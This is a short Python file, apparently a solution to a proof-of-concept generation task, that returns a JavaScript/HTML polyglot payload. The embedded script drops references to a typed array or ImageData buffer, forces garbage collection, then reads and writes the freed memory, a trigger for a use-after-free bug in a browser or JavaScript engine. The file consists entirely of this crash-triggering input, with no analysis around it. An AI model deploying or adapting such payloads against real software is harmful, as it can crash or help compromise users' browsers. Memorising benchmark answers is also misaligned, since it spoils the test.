import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        payload = (
            '(function(){'
            'var a;'
            'if(typeof Uint8ClampedArray=="function")a=new Uint8ClampedArray(1<<20);'
            'else if(typeof ImageData=="function"){var i=new ImageData(512,512);a=i.data;i=0;}'
            'else return;'
            'function G(){'
            'if(typeof gc=="function"){gc();return;}'
            'for(var k=0;k<30;k++){var x=[];for(var j=0;j<1024;j++)x.push(new Uint8Array(0x4000));}'
            '}'
            'G();'
            'for(var t=0;t<1024;t++)a[t]=t;'
            'G();'
            'for(var t=0;t<1024;t++)a[t];'
            '})();'
        )

        polyglot = "/*\n<script>\n" + payload + "\n</script>\n*/\n" + payload + "\n"
        return polyglot.encode("utf-8", "strict")